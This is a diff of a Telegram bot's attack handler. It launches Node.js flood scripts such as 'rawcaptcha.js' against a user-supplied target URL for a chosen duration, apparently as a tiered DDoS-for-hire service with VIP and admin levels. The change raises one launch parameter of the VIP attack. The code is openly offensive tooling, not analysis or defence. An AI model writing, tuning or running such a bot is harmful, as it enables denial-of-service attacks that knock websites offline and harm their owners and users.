@@ -164,7 +164,7 @@ def handle_uam_attack(message):
             command = ['node', 'wormgpt.js', target_url, str(duration), '32', '100', '3']
         else: # VIP and Admin
             bot.reply_to(message, f"VIP attack initiated on {target_url} for {duration} seconds.")
-            command = ['node', 'rawcaptcha.js', target_url, str(duration), '5', '4', '6']
+            command = ['node', 'rawcaptcha.js', target_url, str(duration), '5', '10', '6']
 
         subprocess.Popen(command)
 
